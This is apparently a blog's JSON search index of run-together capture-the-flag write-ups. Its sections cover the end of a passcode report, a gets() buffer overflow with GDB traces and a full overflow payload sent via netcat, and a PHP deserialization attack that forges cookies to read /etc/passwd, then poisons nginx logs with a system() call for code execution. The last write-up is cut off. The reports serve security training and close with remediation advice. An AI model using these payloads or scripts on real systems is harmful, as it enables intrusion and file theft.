The buffer of getline   can then be parsed with sscanf  The aforementioned remediations should be followed as soon as possible to prevent the attack described in this report  It is essential that the developer follow safe programming practices especially when dealing with user input1    ftnt ref1   https   www geeksforgeeks org use fflushstdin c   https   www google com url q https   www geeksforgeeks org use fflushstdin c  sa D source editors ust 1653864729160551 usg AOvVaw0JmJ0 LpCxtrKzLtPMzBfQ2    ftnt ref2   https   www gnu org software gdb   https   www google com url q https   www gnu org software gdb  sa D source editors ust 1653864729160941 usg AOvVaw2s2RbpT1nFhELN7Yi9P4iz3    ftnt ref3   https   docs oracle com cd E26505 01 html E26506 chapter6 1235 html  https   www google com url q https   docs oracle com cd E26505 01 html E26506 chapter6 1235 html sa D source editors ust 1653864729161250 usg AOvVaw2Wx89FF2qXcxgj 3 yhVSb4    ftnt ref4   https   en wikipedia org wiki Global Offset Table  https   www google com url q https   en wikipedia org wiki Global Offset Table sa D source editors ust 1653864729161596 usg AOvVaw1J9heddWBDEf VYj jhwKN5    ftnt ref5   https   man7 org linux man pages man3 getline 3 html  https   www google com url q https   man7 org linux man pages man3 getline 3 html sa D source editors ust 1653864729161892 usg AOvVaw3hGgRl 8dbIW9fY rfkhgM",
      "image": "/images/passcode.png"
    } ,
  
    {
      "title"    : "You Know Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/07/01/You-Know-Writeup/",
      "date"     : "Jul 1, 2021",
      "content"  : "layout  posttitle   You Know Writeupdescription  This challenge involved exploiting a vulnerable program that did not perform proper boundary checks as due to the gets   function date    2021 07 01 image     images 0xd4y logo gray png tags     Buffer Overflow  ShellcodeThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Writer 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedYou KnowBuffer overflow and local variable control    images 0xd4y logo gray png 0xd4yJuly 1  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653862543177328 usg AOvVaw07rtfKrQGrvuf23p3u 324Email   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653862543178333 usg AOvVaw3pAAJNOU UYHC5Q5l BU ITable of ContentsExecutive Summary   h 2gk743bl4yws          2   h 2gk743bl4ywsAttack Narrative   h pr8enummwiwu          3   h pr8enummwiwuBinary Analysis   h bu1ixoil031f          3   h bu1ixoil031fBehavior   h zgljwihwqixr          3   h zgljwihwqixrGhidra   h ihree4tnkztp          3   h ihree4tnkztpGDB   h 1loso1rrgfxw          4   h 1loso1rrgfxwConstructing Exploit   h vm4yqgrk2lne          5   h vm4yqgrk2lneEIP Offset   h yex19f1is0c0          5   h yex19f1is0c0Flag   Debug   h pdh03pw72xk4          6   h pdh03pw72xk4Exploit   h vm7trvreou2e          12   h vm7trvreou2eConclusion   h susjdnco5e24          15   h susjdnco5e24Executive SummaryThe binary in question was provided within a zip file  The source code of the program was not given  and analysis was performed using Ghidra for static analysis and GDB for dynamic analysis  Due to the usage of the vulnerable gets   function which fails to perform boundary checks  the program is vulnerable to buffer overflow exploitsAttack NarrativeThe IP and port on which the vulnerable binary runs is givenIPPort159 65 54 5031449Other than this information  no other data is providedBinary AnalysisBefore attempting to execute the binary  is it essential to first analyze how it worksBehaviorUpon executing the binary  the user is prompted with an inputhighlight bash    0xd4y Writeup     business hackthebox easy windows love                                                                                                                         vulnYou know who are 0xDiablos testtest   endhighlightWhatever string the user inputs  the same input gets printed back out  To analyze how this binary works  tools such as GDB  1    ftnt1   for dynamic analysis  and Ghidra  2    ftnt2   for static analysis  are used throughout this reportGhidraMany different programs can be used for static analysis  however Ghidra  a tool created by the NSA  is utilized throughout this report because of its capability to translate assembly code into C code for easier analysis  Looking at the output of Ghidra  the following three functions are found reports You Know image2 png Within main   the string You know who are 0xDiablos  is printed out before the vuln   function is executed  This function allocates 180 bytes to the buffer local bc before the vulnerable gets   function is executed with local bc as the argument  The gets   function is a deprecated function within C due to its inability to perform boundary checks on the user input  The manual for the function states to  Never use this function   3    ftnt3The third function of the binary  namely flag    was not called by either main   or vuln    The flag   function checks if a file flag txt exists  If it does  then it performs an if statement in which it compares the param 1 and param 2 to certain hex values  On condition that this if statement is true  the contents of flag txt are read outGDB        Analysing this function through GDB helps in dissecting what the program is doing on the assembly levelhighlight bash 0x08049246   100     cmp    DWORD PTR  ebp 0x8  0xdeadbeef                        0x0804924d   107     jne    0x8049269  flag 135                                   0x0804924f   109     cmp    DWORD PTR  ebp 0xc  0xc0ded00d   endhighlightThe aforementioned if statement compares the value of the base pointer   8 to 0xdeadbeef and the base pointer   12 to 0xc0ded00d  Therefore  a successful exploit will constitute the control of the foregoing base pointer addresses along with the overwriting of the EIP register to point to the flag   functionConstructing ExploitEIP OffsetThe offset of the EIP register overwrite must first be determined  Within GDB  in order to provide an input to a program which prompts the user for a string  the desired string must first be echoed into a file  The contents of this file can then be run within the debugger  Hence  using the cyclic function  a pattern of 200 bytes was echoed into a file called eip overwrite as followshighlight bash    0xd4y Writeup     business hackthebox easy windows love                                                                                                                       cyclic 200   eip overwrite   endhighlightThe contents of this file are then piped into the program with r   eip overwritehighlight bash    0xd4y Writeup     business hackthebox challenges pwn easy you know                                                                                                     gdb  q   vulnpwndbg  loaded 196 commands  Type pwndbg  filter  for a list pwndbg  created  rebase   ida gdb functions  can be used with print break Reading symbols from   vuln                                                            No debugging symbols found in   vuln                                                                                                                                       pwndbg  r   eip overwriteStarting program   home 0xd4y business hackthebox challenges pwn easy you know vuln   eip overwriteYou know who are 0xDiablos aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabProgram received signal SIGSEGV  Segmentation fault 0x62616177 in                LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                                                                  REGISTERS                                                                                  EAX  0xc9                EBX  0x62616175   uaab  ECX  0xffffffffEDX  0xffffffffEDI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   ESI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   EBP  0x62616176   vaab  ESP  0xffffd020      xaabyaab EIP  0x62616177   waab                                                                                     DISASM                                                                                    Invalid address 0x62616177The EIP register was successfully overwritten  and the offset can now be calculated with cyclic  l 0x62616177pwndbg  cyclic  l 0x62616177188   endhighlightThus  188 bytes can be passed into the buffer before the EIP register is overwrittenFlag   DebugWith the EIP register successfully overwritten  the next step is to control it such that it points to the flag   function  Before determining where this function lies in memory  it is imperative to first establish that this binary is in little endian formathighlight bash        0xd4y Writeup     business hackthebox challenges pwn easy you know       file vulnvuln  ELF 32 bit LSB executable  Intel 80386  version 1  SYSV   dynamically linked  interpreter  lib ld linux so 2  BuildID sha1  ab7f19bb67c16ae453d4959fba4e6841d930a6dd  for GNU Linux 3 2 0  not stripped   endhighlightAfter finding out that this binary is an LSB executable  the next step is to discover where flag   is in memory  This can be done with the info functions command within GDBhighlight bash pwndbg  info functionsAll defined functionsNon debugging symbols 0x08049000   init0x08049030  printf plt0x08049040  gets plt0x08049050  fgets plt0x08049060  getegid plt0x08049070  puts plt0x08049080  exit plt0x08049090    libc start main plt0x080490a0  setvbuf plt0x080490b0  fopen plt0x080490c0  setresgid plt0x080490d0   start0x08049110   dl relocate static pie0x08049120    x86 get pc thunk bx0x08049130  deregister tm clones0x08049170  register tm clones0x080491b0    do global dtors aux0x080491e0  frame dummy0x080491e2  flag0x08049272  vuln0x080492b1  main0x08049330    libc csu init0x08049390    libc csu fini0x08049391    x86 get pc thunk bp0x08049398   fini   endhighlightNote the functions of interest which are in redFlag   is at 0x080491e2 which in little endian byte format is xe2x91x04x08  Therefore  upon inputting a string of 188 bytes followed by the address of the flag  the program should call the functionhighlight bash    0xd4y Writeup     business hackthebox challenges pwn easy you know       python  c  print  A  188    xe2x91x04x08     eip flag   endhighlightBefore running this malicious string  recall that the program exits if the file flag txt does not exist  This file was simply created using the touch command as followshighlight bash    0xd4y Writeup     business hackthebox challenges pwn easy you know       touch flag txt   endhighlightThe comparison within the function in question starts at flag 100  or 0x08049246   This can be found using the disass  short for disassemble  command within GDBhighlight bash pwndbg  disass flag                                                                                                                                                  Dump of assembler code for function flag                                               0x080491e2   0       push   ebp                                                     0x080491e3   1       mov    ebp esp                                                 0x080491e5   3       push   ebx                                                     0x080491e6   4       sub    esp 0x54  0x080491e9   7       call   0x8049120    x86 get pc thunk bx   0x080491ee   12      add    ebx 0x2e12  0x080491f4   18      sub    esp 0x8  0x080491f7   21      lea    eax  ebx 0x1ff8   0x080491fd   27      push   eax  0x080491fe   28      lea    eax  ebx 0x1ff6   0x08049204   34      push   eax  0x08049205   35      call   0x80490b0  fopen plt   0x0804920a   40      add    esp 0x10  0x0804920d   43      mov    DWORD PTR  ebp 0xc  eax  0x08049210   46      cmp    DWORD PTR  ebp 0xc  0x0  0x08049214   50      jne    0x8049232  flag 80   0x08049216   52      sub    esp 0xc  0x08049219   55      lea    eax  ebx 0x1fec   0x0804921f   61      push   eax  0x08049220   62      call   0x8049070  puts plt   0x08049225   67      add    esp 0x10  0x08049228   70      sub    esp 0xc  0x0804922b   73      push   0x0  0x0804922d   75      call   0x8049080  exit plt   0x08049232   80      sub    esp 0x4  0x08049235   83      push   DWORD PTR  ebp 0xc   0x08049238   86      push   0x40  0x0804923a   88      lea    eax  ebp 0x4c   0x0804923d   91      push   eax  0x0804923e   92      call   0x8049050  fgets plt   0x08049243   97      add    esp 0x10  0x08049246   100     cmp    DWORD PTR  ebp 0x8  0xdeadbeef  0x0804924d   107     jne    0x8049269  flag 135   0x0804924f   109     cmp    DWORD PTR  ebp 0xc  0xc0ded00d  0x08049256   116     jne    0x804926c  flag 138   0x08049258   118     sub    esp 0xc  0x0804925b   121     lea    eax  ebp 0x4c   0x0804925e   124     push   eax  0x0804925f   125     call   0x8049030  printf plt   0x08049264   130     add    esp 0x10  0x08049267   133     jmp    0x804926d  flag 139   0x08049269   135     nop  0x0804926a   136     jmp    0x804926d  flag 139   0x0804926c   138     nop  0x0804926d   139     mov    ebx DWORD PTR  ebp 0x4   0x08049270   142     leave   0x08049271   143     ret   End of assembler dumpPrior to piping the contents of eip flag into the binary  a breakpoint was set at 0x08049246 to allow further investigation into the EBP registerpwndbg  b  0x08049246                                                                Breakpoint 1 at 0x8049246Finally  the malicious string can be runpwndbg  r   eip flagStarting program   home 0xd4y business hackthebox challenges pwn easy you know vuln   eip flagYou know who are 0xDiablos AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 1  0x08049246 in flag   LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                      REGISTERS                                       EAX  0x0EBX  0x804c000   GLOBAL OFFSET TABLE       0x804bf10   DYNAMIC      add    dword ptr  eax   eaxECX  0x0EDX  0xfbad2498EDI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   ESI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   EBP  0xffffd01c      AAAA ESP  0xffffcfc4     0x41414141   AAAA  EIP  0x8049246  flag 100      cmp    dword ptr  ebp   8   0xdeadbeef   endhighlightAs expected  the breakpoint at flag 100 was hit  Looking at ebp 0x8  it can be observed that it was not overwrittenhighlight bash pwndbg  x x  ebp 0x80xffffd024      0xffffd0f4   endhighlightUpon looking at the first 16 bytes of the EBP register  an interesting circumstance can be noticedhighlight bash pwndbg  x 4x  ebp0xffffd01c      0x41414141      0x00000000      0xffffd0f4      0xffffd0fc   endhighlightAt exactly  ebp  the junk bytes that are present in the malicious string can be seen  Following that is a succession of eight zeroes followed by the value of  ebp 0x8 and  ebp 0xc  This succession of zeroes is particularly interesting as it is not clear what it relates to  Modifying the malicious string by adding four B s to the end of it and piping it into the program  reveals an interesting behavior within the binaryhighlight bash    0xd4y Writeup     business hackthebox challenges pwn easy you know       python  c  print  A  188    xe2x91x04x08   BBBB     eip flagpwndbg  r   eip flag                                                                  Starting program   home 0xd4y business hackthebox challenges pwn easy you know vuln   eip flagYou know who are 0xDiablos                                                           AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBreakpoint 1  0x08049246 in flag           LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                                                          REGISTERS                                       EAX  0x0                                  EBX  0x804c000   GLOBAL OFFSET TABLE       0x804bf10   DYNAMIC      add    dword ptr  eax   eaxECX  0x0                                  EDX  0xfbad2498                          EDI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   ESI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   EBP  0xffffd01c      AAAABBBB              ESP  0xffffcfc4     0x41414141   AAAA      EIP  0x8049246  flag 100      cmp    dword ptr  ebp   8   0xdeadbeef   endhighlightNow  looking at the EBP register  observe the value at  ebp 0x4highlight bash pwndbg  x 4x  ebp0xffffd01c      0x41414141      0x42424242      0xffffd000      0xffffd0fc   endhighlightThus   ebp 0x8 and  ebp 0xc can now successfully be controlled by appending 0xdeadbeef and 0xc0ded00d in little endian byte format  xefxbexadxde and x0dxd0xdexc0 respectivelyExploitTherefore  the final exploit will take the following formJUNK BYTE 188   ADDRESS OF FLAG   JUNK2 BYTE 4   DEADBEEF   C0DED00DWhereJUNK BYTE   AJUNK2 BYTE   BADDRESS OF FLAG   xe2x91x04x08DEADBEEF   xefxbexadxdeC0DED00D   x0dxd0xdexc0Piping the contents of eip flag into the binary and checking the EBP register  it can be seen that ebp 0x8 and ebp 0xc were successfully controlledhighlight bash        0xd4y Writeup     business hackthebox challenges pwn easy you know       python  c  print  A  188    xe2x91x04x08   BBBB   xefxbexadxde   x0dxd0xdexc0     eip flagpwndbg  r   eip flag                                                                                                                                                   4 579 Starting program   home 0xd4y business hackthebox challenges pwn easy you know vuln   eip flag                                                                              You know who are 0xDiablos                                                                                                                                                   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBreakpoint 1  0x08049246 in flag           LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                                                          REGISTERS                                       EAX  0x0                                  EBX  0x804c000   GLOBAL OFFSET TABLE       0x804bf10   DYNAMIC      add    dword ptr  eax   eaxECX  0x0                                  EDX  0xfbad2498                          EDI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   ESI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   EBP  0xffffd01c     0x41414141   AAAA      ESP  0xffffcfc4     0x41414141   AAAA      EIP  0x8049246  flag 100      cmp    dword ptr  ebp   8   0xdeadbeef                                                       DISASM                                             0x8049246  flag 100     cmp    dword ptr  ebp   8   0xdeadbeef                      0x804924d  flag 107     jne    flag 135  flag 1350x804924f  flag 109     cmp    dword ptr  ebp   0xc   0xc0ded00d                    0x8049256  flag 116     jne    flag 138  flag 1380x8049258  flag 118     sub    esp  0xc                                              0x804925b  flag 121     lea    eax   ebp   0x4c                                     0x804925e  flag 124     push   eax       0x804925f  flag 125     call   printf plt  printf plt0x8049264  flag 130     add    esp  0x10                                            0x8049267  flag 133     jmp    flag 139  flag 1390x8049269  flag 135     nop                                                  STACK                                            00 0000  esp 0xffffcfc4     0x41414141   AAAA                                                                             BACKTRACE                                            f 0 0x8049246 flag 100                    f 1 0x42424242                            f 2 0xdeadbeef                            f 3 0xc0ded00d                            f 4    0x300pwndbg  x 4x  ebp0xffffd01c      0x41414141      0x42424242      0xdeadbeef      0xc0ded00d   endhighlightConsequently  the if statement discussed earlier in the  Ghidra   h ihree4tnkztp  section will run true  After piping the malicious string into netcat  the flag txt file located within the server is printed outhighlight bash        0xd4y Writeup     business hackthebox challenges pwn easy you know       nc 159 65 54 50 31449   eip flagYou know who are 0xDiablos  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB HTB 0ur Buff3r 1s not healthy    0xd4y Writeup     business hackthebox challenges pwn easy you knowendhighlightConclusionThe binary in question was vulnerable to a buffer overflow attack due to the lack of boundary checks performed on user input  The deprecated gets   function was used within the binary despite the security warnings that are associated with it  As a result  memory could be overwritten resulting in behavior that the binary was not written to perform  The following remediations should be strongly consideredNever use the deprecated gets   functionUsage of this function creates the possibility for security risks that could allow malicious actors to run arbitrary codeUse the secure fgets   functionThis function reads user input until a newline character is found or until the buffer gets filledThe aforementioned remediations should be observed as soon as possible  Until this binary is patched  the service running on port 31449 should be disabled1    ftnt ref1   https   www gnu org software gdb   https   www google com url q https   www gnu org software gdb  sa D source editors ust 1653862543264892 usg AOvVaw2WG82PXaT9xLvUVSxNsry42    ftnt ref2   https   github com NationalSecurityAgency ghidra  https   www google com url q https   github com NationalSecurityAgency ghidra sa D source editors ust 1653862543264457 usg AOvVaw3kUKvphtd395QkJ0zU s9p3    ftnt ref3   https   man7 org linux man pages man3 gets 3 html  https   www google com url q https   man7 org linux man pages man3 gets 3 html sa D source editors ust 1653862543263762 usg AOvVaw1WeTWTgKm gKvE0D5cStuy",
      "image": "/images/You_Know.png"
    } ,
  
    {
      "title"    : "Toxic Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/05/29/Toxic-Writeup/",
      "date"     : "May 29, 2021",
      "content"  : "layout  posttitle   Writer Writeupdescription  This was a challenge hosted on HackTheBox that involved exploting a PHP deserilization vulnerability to gain LFI and eventually RCEdate    2021 05 29image     images 0xd4y logo gray png tags     RCE  PHP Deserialization  LFIThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Toxic 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedToxicExploiting PHP Deserialization    reports Toxic image2 png 0xd4yMay 29  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653962355816235 usg AOvVaw2vOK1T2csGCz66a0ke4j7DEmail   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653962355816955 usg AOvVaw2ZCDb9yViv8hdtjjBIpHYYTable of ContentsExecutive Summary   h 2gk743bl4yws          1   h 2gk743bl4ywsAttack Narrative   h fghdla5fgquk          2   h fghdla5fgqukWebsite Analysis   h s3etgisko63w          3   h s3etgisko63wDiscovering Object Injection   h qzzjl3ics06l          3   h qzzjl3ics06lUnderstanding PHP Serialized Objects   h ohggjihxz1mu          4   h ohggjihxz1muLFI   h fh9ckpvnfioa          4   h fh9ckpvnfioaLocal File Enumeration   h 55a1thok20m8          8   h 55a1thok20m8RCE   h 66g3t2a8xlqq          9   h 66g3t2a8xlqqPost Exploitation Analysis   h px1q03fgnzid          12   h px1q03fgnzidCause of Object Injection Vulnerability   h uad6s22ovnor          12   h uad6s22ovnorConclusion   h susjdnco5e24          14   h susjdnco5e24Executive SummarySerialization is used to convert data to be stored in a manner that can be easily sent across a network  transferred to a file  or added to a database  The main purpose of this process of conversion is to save the state of an objectWhen untrusted user controlled data is saved into an object and an operation is performed on it  potential vulnerabilities could arise  Such is the case with the website discussed within this report  The PHPSESSID serialization cookie  provided upon accessing the website  was passed directly into an include statement  This resulted in a local file inclusion vulnerability  LFI  which was then upgraded to remote code execution  RCEAttack NarrativeOther than having been provided the source code for this challenge  no other information was given except for the IP of the box and the port on which the HTTP service sits  Despite having the source code  this challenge will be treated as if that information was not given so as to replicate real world black box environment engagementsWebsite AnalysisTo begin analyzing for vulnerabilities  the website will first be accessed reports Toxic image1 png After crawling through the website  nothing out of the ordinary was discovered  There was nothing on the website that looked for user input  so common web vulnerabilities related to XSS and SQL were unlikely to be present on the websiteDiscovering Object InjectionHowever  after intercepting a request to the website with BurpSuite  it could be seen that the website provides a cookie to the clienthighlight bash GET   HTTP 1 1Host  167 99 88 212 30746User Agent  Mozilla 5 0  Windows NT 10 0  rv 78 0  Gecko 20100101 Firefox 78 0Accept  text html application xhtml xml application xml q 0 9 image webp       q 0 8Accept Language  en US en q 0 5Accept Encoding  gzip  deflateDNT  1Connection  closeCookie  PHPSESSID Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9Upgrade Insecure Requests  1   endhighlightThis is peculiar as there is no need for a cookie on the website because it does not have any functionality  Looking at the value for the cookie  the byte stream looks similar to base64  After base64 decoding it  the following interesting information is discoveredhighlight bash           0xd4y Writeup       business hackthebox challenges web toxic        echo  n Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9 base64  d  echoO 9  PageModel  1  s 4  file  s 15   www index html    endhighlightFrom the decoded output  the cookie can be identified as a serialized PHP object Understanding PHP Serialized ObjectsThe O at the beginning of the output represents  Object   and the number 9 represents the number of characters that comprise the name of the object  in this case it is  PageModel  which is nine characters in length   The letter  s  represents string  and it refers to the type of the data that it precedesLFIFollowing the modification of  www index html to  etc passwd  the server s response changeshighlight bash       echo  n    O 9  PageModel  1  s 4  file  s 11   etc passwd       base64Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30    endhighlightNote that the data s 15 was modified to s 11 because  etc passwd is 11 characters longRequesthighlight bash GET   HTTP 1 1Host  167 99 88 212 30746User Agent  Mozilla 5 0  Windows NT 10 0  rv 78 0  Gecko 20100101 Firefox 78 0Accept  text html application xhtml xml application xml q 0 9 image webp       q 0 8Accept Language  en US en q 0 5Accept Encoding  gzip  deflateDNT  1Connection  closeCookie  PHPSESSID Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30 Upgrade Insecure Requests  1   endhighlightReponsehighlight bash HTTP 1 1 200 OKServer  nginxDate  Sat  29 May 2021 21 25 41 GMTContent Type  text html  charset UTF 8Connection  closeX Powered By  PHP 7 4 15Content Length  1262root x 0 0 root  root  bin ashbin x 1 1 bin  bin  sbin nologindaemon x 2 2 daemon  sbin  sbin nologinadm x 3 4 adm  var adm  sbin nologinlp x 4 7 lp  var spool lpd  sbin nologinsync x 5 0 sync  sbin  bin syncshutdown x 6 0 shutdown  sbin  sbin shutdownhalt x 7 0 halt  sbin  sbin haltmail x 8 12 mail  var mail  sbin nologinnews x 9 13 news  usr lib news  sbin nologinuucp x 10 14 uucp  var spool uucppublic  sbin nologinoperator x 11 0 operator  root  sbin nologinman x 13 15 man  usr man  sbin nologinpostmaster x 14 12 postmaster  var mail  sbin nologincron x 16 16 cron  var spool cron  sbin nologinftp x 21 21   var lib ftp  sbin nologinsshd x 22 22 sshd  dev null  sbin nologinat x 25 25 at  var spool cron atjobs  sbin nologinsquid x 31 31 Squid  var cache squid  sbin nologinxfs x 33 33 X Font Server  etc X11 fs  sbin nologingames x 35 35 games  usr games  sbin nologincyrus x 85 12   usr cyrus  sbin nologinvpopmail x 89 89   var vpopmail  sbin nologinntp x 123 123 NTP  var empty  sbin nologinsmmsp x 209 209 smmsp  var spool mqueue  sbin nologinguest x 405 100 guest  dev null  sbin nologinnobody x 65534 65534 nobody    sbin nologinwww x 1000 1000 1000  home www  bin shnginx x 100 101 nginx  var lib nginx  sbin nologin   endhighlightTherefore  the server is most likely performing some sort of include statement on the file parameter  To efficiently enumerate files on the server  a python script was developed to quickly perform the operation of modifying the file parameter and base64 encoding the objecthighlight python import requests from base64 import b64encodewhile Truef   input         payload      O 9  PageModel  1  s 4  file  s  d   s          len f rstrip    f rstrip      payload   b64encode payload encode      cookies      PHPSESSID    payload decode       html   requests get  http   167 99 88 212 30746  cookies cookies  text   if len html    0        print html    endhighlightIn regards to the last two lines of the file  it was found that upon inputting a nonexistent file  or a file that cannot be read due to lack of permissions   the html output contained 0 bytes of data  Now  instead of tediously base64 encoding the cookie and putting it into BurpSuite  the python script can be run instead to quickly perform this taskhighlight bash     0xd4y Writeup       business hackthebox challenges web toxic        python3 fileread py   etc passwdroot x 0 0 root  root  bin ashbin x 1 1 bin  bin  sbin nologindaemon x 2 2 daemon  sbin  sbin nologinadm x 3 4 adm  var adm  sbin nologinlp x 4 7 lp  var spool lpd  sbin nologinsync x 5 0 sync  sbin  bin syncshutdown x 6 0 shutdown  sbin  sbin shutdownhalt x 7 0 halt  sbin  sbin haltmail x 8 12 mail  var mail  sbin nologinnews x 9 13 news  usr lib news  sbin nologinuucp x 10 14 uucp  var spool uucppublic  sbin nologinoperator x 11 0 operator  root  sbin nologinman x 13 15 man  usr man  sbin nologinpostmaster x 14 12 postmaster  var mail  sbin nologincron x 16 16 cron  var spool cron  sbin nologinftp x 21 21   var lib ftp  sbin nologinsshd x 22 22 sshd  dev null  sbin nologinat x 25 25 at  var spool cron atjobs  sbin nologinsquid x 31 31 Squid  var cache squid  sbin nologinxfs x 33 33 X Font Server  etc X11 fs  sbin nologingames x 35 35 games  usr games  sbin nologincyrus x 85 12   usr cyrus  sbin nologinvpopmail x 89 89   var vpopmail  sbin nologinntp x 123 123 NTP  var empty  sbin nologinsmmsp x 209 209 smmsp  var spool mqueue  sbin nologinguest x 405 100 guest  dev null  sbin nologinnobody x 65534 65534 nobody    sbin nologinwww x 1000 1000 1000  home www  bin sh   endhighlightFrom the output of the  etc passwd file  two particular entries can be seen  the root user is running  bin ash instead of the normal  bin bash  this may be to prevent users from getting to root unless it is aliased to something   and there is a local user named www running  bin shLocal File EnumerationA second python script was created to quickly enumerate the local files on the systemhighlight python import requestsfrom base64 import b64encodefor f in open  lfi txt   r   readlinespayload      O 9  PageModel  1  s 4  file  s  d   s          len f rstrip    f rstrip      payload   b64encode payload encode      cookies      PHPSESSID    payload decode       html   requests get  http   167 99 88 212 30746  cookies cookies  text   if len html    0        print f strip    endhighlightThe script opens file called lfi txt   1     ftnt1  and puts the file name into the object  When the file is present on the system  the length of the response will be greater than 0 bytes  and the name of the file will be printed out  However  after the python script finished executing  no interesting files were discoveredhighlight bash  etc passwd etc fstab etc hosts etc inittab etc issue etc motd etc motd etc mtab etc profile etc resolv conf proc cpuinfo proc filesystems proc interrupts proc ioports proc meminfo proc modules proc mounts proc stat proc swaps proc version proc self net arp   endhighlightRCESeeing as an LFI vulnerability was detected  the possibility of upgrading this to RCE is something of interest  A common methodology for converting an LFI vulnerability to RCE is log poisoning   2     ftnt2   a process in which a malicious GET request causes a log file to execute PHP  Before performing the malicious GET request  the location of the access log must first be identified  this can be done with the help of Nmap and Googlehighlight bash           0xd4y Writeup       business hackthebox challenges web toxic        nmap  p 30746 167 99 88 212  sC  sV  PnHost discovery disabled   Pn   All addresses will be marked  up  and scan times will be slower Starting Nmap 7 91   https   nmap org   at 2021 05 30 00 50 BSTNmap scan report for 167 99 88 212Host is up  0 12s latencyPORT      STATE SERVICE VERSION30746 tcp open  http    nginx  http cookie flags              PHPSESSID          httponly flag not set   http title  Dart Frog   endhighlightNmap detects the version running on the HTTP service to be nginx  After googling for the location of the file  it was found that the access log is located at  var log nginx access log   3     ftnt3highlight bash    var log nginx access log167 99 88 212   200  GET   HTTP 1 1       python requests 2 13 0   endhighlightWhen a GET request with PHP is performed on the web server  code execution can be observedRequesthighlight bash           0xd4y Writeup       business hackthebox challenges web toxic        nc 167 99 88 212 30105GET   php system  ls     HTTP 1 1 400 Bad RequestServer  nginxDate  Sun  30 May 2021 05 44 42 GMTContent Type  text html  charset utf 8Content Length  150Connection  closehtml  head  title 400 Bad Request  title   head  body  center  h1 400 Bad Request  h1   center  hr  center nginx  center   body   html    endhighlightOutputhighlight bash    var log nginx access log167 99 88 212   200  GET   HTTP 1 1       python requests 2 13 0  167 99 88 212   200  GET   HTTP 1 1       python requests 2 13 0  167 99 88 212   400  GET index htmlindex phpmodelsstaticendhighlightTo find the flag file  the ls  R  for recursive  was used  After performing the same methodology used above  the flag file was found in the root directory of the systemhighlight bash bindeventrypoint shetcflag  zHN96homelibmediamntopt   endhighlightFinally  the flag can be grabbedhighlight bash    flag  zHN96HTB P0i5o  REDACTED  F4R3    endhighlightPost Exploitation AnalysisDue to the source code being given  the code responsible for the deserialization vulnerability can easily be analyzedCause of Object Injection VulnerabilityThe file associated with the serialized cookie is index php  and the 